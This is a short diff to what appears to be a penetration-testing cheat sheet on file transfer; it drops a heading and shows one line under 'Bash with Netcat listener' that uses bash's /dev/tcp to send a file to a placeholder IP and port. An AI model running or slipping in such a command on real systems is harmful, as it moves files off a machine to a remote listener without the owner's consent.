@@ -1,4 +1,3 @@
-# Files Transfer
 ## Bash with Netcat listener
 Upload:
 `bash -c 'cat <FILE> > /dev/tcp/<IP>/<PORT>'`
